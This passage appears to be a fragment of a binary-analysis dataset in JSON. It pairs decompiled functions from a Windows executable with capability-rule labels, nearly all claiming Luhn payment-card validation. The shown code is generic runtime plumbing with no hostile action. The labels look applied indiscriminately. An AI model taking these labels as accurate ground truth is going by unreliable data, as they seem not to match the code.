        "decompiled_code": "\nint32_t * fcn.004049bc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4049eb;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + -0x1c))();\n    *in_FS_OFFSET = uStack32;\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "00404edc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404edc(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint *in_stack_00000014;\n    int32_t in_stack_00000030;\n    \n    *(in_stack_00000030 + 4) = 0x404f27;\n    piVar3 = fcn.0040772c();\n    piVar2 = *piVar3;\n    *piVar3 = *piVar2;\n    piVar2 = piVar2[3];\n    puVar1 = piVar2 + 1;\n    *puVar1 = *puVar1 & 0xfffffffd;\n    if (*piVar2 != 0xeedfade) {\n        fcn.00404640();\n        fcn.00404a1c();\n    }\n    *in_stack_00000014 = **in_FS_OFFSET;\n    return 1;\n}\n",
        "token_count": 215
    },
    "00404f78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f78(int32_t *arg_8h)\n\n{\n    fcn.00402fe8();\n    return;\n}\n",
        "token_count": 34
    },
    "0040520c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040520c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.004075f4();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 74
    },
    "00405234": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405234(void)\n\n{\n    int32_t *in_EAX;\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    iVar2 = *in_EAX;\n    ppiVar1 = in_EAX + 1;\n    do {\n        **ppiVar1 = *ppiVar1[1] + ppiVar1[2];\n        ppiVar1 = ppiVar1 + 3;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 121
    },
    "00405490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405490(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    do {\n        iVar2 = *in_EAX;\n        if ((iVar2 != 0) && (*in_EAX = 0,  0 < *(iVar2 + -8))) {\n            LOCK();\n            piVar1 = iVar2 + -8;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                fcn.00402f0c();\n            }\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 183
    },
    "00405530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.00405530(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (0 < in_EAX) {\n        puVar1 = fcn.00402ef0();\n        *(((in_EAX + 10U & 0xfffffffe) - 2) + puVar1) = 0;\n        puVar1[1] = in_EAX;\n        *puVar1 = 1;\n        return puVar1 + 2;\n    }\n    return NULL;\n}\n",
        "token_count": 117
    },
    "004055c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004055c8(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.0040546c(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.0040558c(param_1),  -1 < iVar1)) {\n        fcn.0040555c();\n    }\n    else {\n        fcn.00405b8c();\n        fcn.0040558c(param_1);\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00405664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405664(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; (((*pcVar2 != '\\0' && (pcVar2[1] != '\\0')) && (pcVar2[2] != '\\0')) && (pcVar2[3] != '\\0'));\n            pcVar2 = pcVar2 + 4) {\n        }\n    }\n    uVar1 = fcn.00405530();\n    if (param_2 != NULL) {\n        fcn.004030ec();\n    }\n    fcn.0040546c();\n    *in_EAX = uVar1;\n    return;\n}\n",
        "token_count": 182
    },
    "004056dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004056dc(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_EAX;\n    char *pcVar3;\n    \n    pcVar3 = param_2;\n    do {\n        if (param_1 == 0) break;\n        param_1 = param_1 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = fcn.00405530();\n    if (param_2 != NULL) {\n        fcn.004030ec();\n    }\n    fcn.0040546c();\n    *in_EAX = uVar2;\n    return;\n}\n",
        "token_count": 175
    },
    "00405738": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405738(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    if (param_2 == 0) {\n        return;\n    }\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        if (!SCARRY4(*(param_2 + -4), *(iVar2 + -4))) {\n            if (param_2 == iVar2) {\n                fcn.00405b8c();\n            }\n            else {\n                fcn.00405b8c();\n            }\n            fcn.004030ec();\n            return;\n        }\n        if (*0x493008 != NULL) {\n            (**0x493008)(param_2);\n        }\n        fcn.00402fe8();\n        return;\n    }\n    if (param_2 != 0) {\n        iVar2 = *(param_2 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            param_2 = fcn.00405530(param_2);\n            fcn.004030ec();\n        }\n        else {\n            LOCK();\n            *(param_2 + -8) = *(param_2 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = param_2;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f0c();\n        }\n    }\n    return;\n}\n",
        "token_count": 417
    },
    "00405784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405784(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t **in_EAX;\n    int32_t iVar4;\n    \n    ppiVar3 = param_1;\n    if ((param_2 != NULL) && (ppiVar3 = param_2,  param_1 != NULL)) {\n        if (param_2 != *in_EAX) {\n            if (param_1 == *in_EAX) {\n                in_EAX = param_2;\n                if (!SCARRY4(param_2[-1], param_1[-1])) {\n                    iVar4 = fcn.00405530();\n                    fcn.004030ec();\n                    fcn.004030ec();\n                    if (iVar4 != 0) {\n                        *(iVar4 + -8) = *(iVar4 + -8) + -1;\n                    }\n                    fcn.004054c0();\n                    return;\n                }\n                goto code_r0x00402ff4;\n            }\n            fcn.004054c0();\n        }\n        if (param_1 == NULL) {\n            return;\n        }\n        ppiVar2 = *in_EAX;\n        ppiVar3 = param_1;\n        if (ppiVar2 != NULL) {\n            if (!SCARRY4(param_1[-1], ppiVar2[-1])) {\n                if (param_1 == ppiVar2) {\n                    fcn.00405b8c();\n                }\n                else {\n                    fcn.00405b8c();\n                }\n                fcn.004030ec();\n                return;\n            }\ncode_r0x00402ff4:\n            if (*0x493008 != NULL) {\n                (**0x493008)(param_1, in_EAX);\n            }\n            fcn.00402fe8();\n            return;\n        }\n    }\n    if (ppiVar3 != NULL) {\n        piVar1 = ppiVar3[-2];\n        if (piVar1 == 0xffffffff || SCARRY4(piVar1, 1) != piVar1 + 1 < 0) {\n            ppiVar3 = fcn.00405530(ppiVar3);\n            fcn.004030ec();\n        }\n        else {\n            LOCK();\n            ppiVar3[-2] = ppiVar3[-2] + 1;\n        }\n    }\n    piVar1 = *in_EAX;\n    *in_EAX = ppiVar3;\n    if ((piVar1 != NULL) && (0 < piVar1[-2])) {\n        LOCK();\n        piVar1 = piVar1 + -2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f0c();\n        }\n    }\n    return;\n}\n",
        "token_count": 656
    },
    "00405800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405800(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    bool bVar5;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iStack24;\n    \n    piVar4 = NULL;\n    piVar1 = *(&stack0x00000000 + param_2 * 4);\n    if ((piVar1 == NULL) || (*in_EAX != piVar1)) {\n        iVar2 = 0;\n        iVar3 = param_2;\n    }\n    else {\n        iVar2 = piVar1[-1];\n        iVar3 = param_2 + -1;\n        piVar4 = piVar1;\n    }\n    do {\n        piVar1 = *(&stack0x00000000 + iVar3 * 4);\n        if (piVar1 != NULL) {\n            bVar5 = SCARRY4(iVar2, piVar1[-1]);\n            iVar2 = iVar2 + piVar1[-1];\n            if (bVar5) {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402fe8();\n                return;\n            }\n            if (piVar4 == piVar1) {\n                piVar4 = NULL;\n            }\n        }\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    if (piVar4 == NULL) {\n        iStack24 = fcn.00405530();\n    }\n    else {\n        fcn.00405b8c();\n        iStack24 = *in_EAX;\n        param_2 = param_2 + -1;\n        piVar4 = in_EAX;\n    }\n    do {\n        if (*(&stack0x00000000 + param_2 * 4) != 0) {\n            fcn.004030ec();\n        }\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    if (piVar4 == NULL) {\n        if (iStack24 != 0) {\n            *(iStack24 + -8) = *(iStack24 + -8) + -1;\n        }\n        fcn.004054c0();\n    }\n    // WARNING: Could not recover jumptable at 0x00405889. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 588
    },
    "00405964": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405964(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((in_EAX == 0) || (*(in_EAX + -4) == 0)) || ((0 < param_2 && (*(in_EAX + -4) <= param_2 + -1)))) ||\n       (param_1 < 0)) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.0040555c();\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "004059a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004059a4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00405954();\n    if (*in_EAX != 0) {\n        if (((0 < param_2) && (param_2 + -1 < *(*in_EAX + -4))) && (0 < param_1)) {\n            fcn.004030ec();\n            fcn.00405b8c();\n        }\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "004059ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004059ec(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00405b8c();\n        fcn.004030ec();\n        fcn.004030ec();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00405a48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00405a48(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    \n    if ((param_2 != 0) && (in_EAX != 0)) {\n        iVar5 = *(in_EAX + -4);\n        if ((iVar5 <= *(param_2 + -4)) && (0 < iVar5)) {\n            iVar5 = iVar5 + -1;\n            pcVar6 = *(param_2 + -4) + param_2;\n            pcVar4 = param_2 + iVar5;\n            pcVar2 = in_EAX + iVar5;\n            iVar5 = -iVar5;\n            cVar1 = *pcVar2;\n            if (iVar5 != 0) {\n                pcVar3 = pcVar4;\ncode_r0x00405b20:\n                iVar7 = iVar5;\n                if (cVar1 == *pcVar3) goto code_r0x00405b6f;\ncode_r0x00405b24:\n                iVar7 = iVar5;\n                if (cVar1 == pcVar3[1]) goto code_r0x00405b42;\n                while (pcVar3 = pcVar3 + 2,  pcVar3 < pcVar6 + -2) {\n                    while( true ) {\n                        iVar7 = iVar5;\n                        if (cVar1 == *pcVar3) goto code_r0x00405b6f;\n                        if (cVar1 == pcVar3[1]) goto code_r0x00405b42;\n                        if (cVar1 == pcVar3[2]) {\n                            pcVar3 = pcVar3 + 2;\n                            goto code_r0x00405b6f;\n                        }\n                        if (cVar1 == pcVar3[3]) break;\n                        pcVar3 = pcVar3 + 4;\n                        if (pcVar6 + -2 <= pcVar3) {\n                            if (pcVar6 <= pcVar3) {\n                                return NULL;\n                            }\n                            goto code_r0x00405b20;\n                        }\n                    }\n                    pcVar3 = pcVar3 + 2;\ncode_r0x00405b42:\n                    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7 + 1)) {\n                        bVar8 = SCARRY4(iVar7, 2);\n                        iVar7 = iVar7 + 2;\n                        if (bVar8 == iVar7 < 0) {\n                            if (pcVar3 + 2 <= pcVar6) {\n                                return pcVar3 + 2 + -pcVar4;\n                            }\n                            return NULL;\n                        }\n                    }\n                }\n                if (pcVar6 <= pcVar3) {\n                    return NULL;\n                }\n                goto code_r0x00405b20;\n            }\n            pcVar2 = pcVar4;\n            while (cVar1 != *pcVar2) {\n                if (cVar1 == pcVar2[1]) {\ncode_r0x00405adc:\n                    pcVar3 = NULL;\n                    if (pcVar2 + 2 <= pcVar6) {\n                        pcVar3 = pcVar2 + 2 + -pcVar4;\n                    }\n                    return pcVar3;\n                }\n                pcVar2 = pcVar2 + 2;\n                if (pcVar2 < pcVar6 + -2) {\n                    do {\n                        if (cVar1 == *pcVar2) goto code_r0x00405acc;\n                        if (cVar1 == pcVar2[1]) goto code_r0x00405adc;\n                        if (cVar1 == pcVar2[2]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405acc;\n                        }\n                        if (cVar1 == pcVar2[3]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405adc;\n                        }\n                        pcVar2 = pcVar2 + 4;\n                    } while (pcVar2 < pcVar6 + -2);\n                    if (pcVar6 <= pcVar2) {\n                        return NULL;\n                    }\n                }\n                else if (pcVar6 <= pcVar2) {\n                    return NULL;\n                }\n            }\ncode_r0x00405acc:\n            return pcVar2 + (1 - pcVar4);\n        }\n    }\n    return NULL;\ncode_r0x00405b6f:\n    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7)) {\n        bVar8 = SCARRY4(iVar7, 2);\n        iVar7 = iVar7 + 2;\n        if (bVar8 == iVar7 < 0) {\n            return pcVar3 + (1 - pcVar4);\n        }\n    }\n    goto code_r0x00405b24;\n}\n",
        "token_count": 1102
    },
    "00405c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405c60(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        if (iVar1 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar1);\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 128
    },
    "00405cac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405cac(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.00405c48(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.004055ac(param_1),  0 < iVar1)) {\n        fcn.00405d38();\n    }\n    else {\n        fcn.00405ec4();\n        fcn.004055ac(param_1);\n        fcn.00405ec4();\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00405d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d5c(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    char *pcVar2;\n    \n    arg_8h = 0;\n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *pcVar2 != '\\0'; pcVar2 = pcVar2 + 4) {\n            if (pcVar2[1] == '\\0') {\ncode_r0x00405d7d:\n                pcVar2 = pcVar2 + 1;\n                break;\n            }\n            if (pcVar2[2] == '\\0') {\ncode_r0x00405d7c:\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405d7d;\n            }\n            if (pcVar2[3] == '\\0') {\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405d7c;\n            }\n        }\n        arg_8h = pcVar2 - param_2;\n    }\n    if (arg_8h < 1) {\n        fcn.00405c48(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.004055ac(arg_8h),  0 < iVar1)) {\n        fcn.00405d38();\n    }\n    else {\n        fcn.00405ec4();\n        fcn.004055ac(arg_8h);\n        fcn.00405ec4();\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00405ec4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ec4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (0 < param_2) {\n        fcn.00405c20();\n        iVar1 = fcn.00405de8();\n        if (0 < iVar1) {\n            fcn.004030ec();\n        }\n    }\n    fcn.00405c38();\n    return;\n}\n",
        "token_count": 97
    },
    "00405f08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405f08(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00405f38();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 124
    },
    "00405fcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fcc(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00406018();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 122
    },
    "004063ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.004063ec(uint param_1, int32_t param_2, uint32_t param_3, int32_t param_4)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX * param_3 & 0xffffffff | (in_EAX * param_3 >> 0x20) + param_4 * in_EAX + param_2 * param_3 << 0x20;\n}\n",
        "token_count": 99
    },
    "00406a14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406a14(void)\n\n{\n    fcn.00406888(&stack0x00000004);\n    return;\n}\n",
        "token_count": 31
    },
    "00406a84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.00406a84(void)\n\n{\n    uchar *puVar1;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    puVar1 = auStack28;\n    sub.kernel32.dll_VirtualQuery();\n    if (iStack24 != 0x1000) {\n        puVar1 = NULL;\n    }\n    return puVar1;\n}\n",
        "token_count": 85
    },
    "004075f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004075f4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack4104 [4096];\n    \n    if (in_EAX != 0) {\n        if (*(in_EAX + 4) < 0x10000) {\n            uVar1 = fcn.00406afc(*(in_EAX + 4), auStack4104, 0x1000);\n            sub.user32.dll_LoadStringA(uVar1);\n            fcn.0040555c();\n        }\n        else {\n            fcn.00405664();\n        }\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "004077f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004077f8(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    *arg_8h = in_EAX;\n    arg_8h[1] = in_EDX;\n    arg_8h[2] = in_ECX + in_EAX;\n    arg_8h[3] = in_EDX + arg_ch;\n    return;\n}\n",
        "token_count": 113
    },
    "00409960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00409960(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    \n    if (in_EAX == 0) {\n        if (param_2 != 0) {\n            in_EAX = -*(param_2 + -4);\n        }\n        return in_EAX;\n    }\n    if (param_2 == 0) {\n        return *(in_EAX - 4);\n    }\n    uVar4 = *(param_2 + -4);\n    uVar10 = *(in_EAX - 4) - uVar4;\n    iVar6 = (-(*(in_EAX - 4) < uVar4) & uVar10) + uVar4;\n    iVar7 = -iVar6;\n    if (iVar7 != 0) {\n        do {\n            uVar1 = *(iVar7 + iVar6 + in_EAX);\n            uVar4 = uVar1;\n            uVar2 = *(iVar7 + param_2 + iVar6);\n            uVar8 = uVar2;\n            if (uVar4 != uVar8) {\n                if (uVar1 != uVar2) {\n                    uVar4 = uVar1 & 0xff;\n                    uVar8 = uVar2 & 0xff;\n                    cVar3 = uVar1 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar4 = uVar4 - 0x20;\n                    }\n                    cVar3 = uVar2 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar8 = uVar8 - 0x20;\n                    }\n                    if (uVar4 - uVar8 != 0) {\n                        return uVar4 - uVar8;\n                    }\n                    uVar4 = *(iVar7 + iVar6 + in_EAX);\n                    uVar8 = *(iVar7 + param_2 + iVar6);\n                    if (uVar4 >> 8 == uVar8 >> 8) goto code_r0x004099ee;\n                }\n                uVar5 = uVar4 >> 8;\n                uVar9 = uVar8 >> 8;\n                cVar3 = uVar4 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar5 = uVar5 - 0x20;\n                }\n                cVar3 = uVar8 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar9 = uVar9 - 0x20;\n                }\n                if (uVar5 - uVar9 != 0) {\n                    return uVar5 - uVar9;\n                }\n            }\ncode_r0x004099ee:\n            bVar11 = SCARRY4(iVar7, 2);\n            iVar7 = iVar7 + 2;\n        } while (bVar11 != iVar7 < 0);\n    }\n    return uVar10;\n}\n",
        "token_count": 751
    },
    "00409ce8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409ce8(uint param_1, uint param_2)\n\n{\n    fcn.00409c9c(param_2);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 48
    },
    "00409d08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d08(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cVar8;\n    \n    if ((param_1 == '\\0') && (param_1 = 10,  (*(in_EAX + 4) & 0x80000000) != 0)) {\n        fcn.00409d3c(-*in_EAX, -(*(in_EAX + 4) + (*in_EAX != 0)));\n        unaff_ESI[-1] = 0x2d;\n        return;\n    }\n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cVar8 = ROUND(fVar6);\n        uVar2 = cVar8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cVar8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 516
    },
    "00409dd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409dd4(uint arg_8h)\n\n{\n    fcn.00409d08();\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 40
    },
    "00409dfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409dfc(uint param_1)\n\n{\n    fcn.00409c9c(param_1);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 43
    },
    "00409e24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e24(uint arg_8h)\n\n{\n    fcn.00409d08();\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 40
    },
    "00409ee8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
